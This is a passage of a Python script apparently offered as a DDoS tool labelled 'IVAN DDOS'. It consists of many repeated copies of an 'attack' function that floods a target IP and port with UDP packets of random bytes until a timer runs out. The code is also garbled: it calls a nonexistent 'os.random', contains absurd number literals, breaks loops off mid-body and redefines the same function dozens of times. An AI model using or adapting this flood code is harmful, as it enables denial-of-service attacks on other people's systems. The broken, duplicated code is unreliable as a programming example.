    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
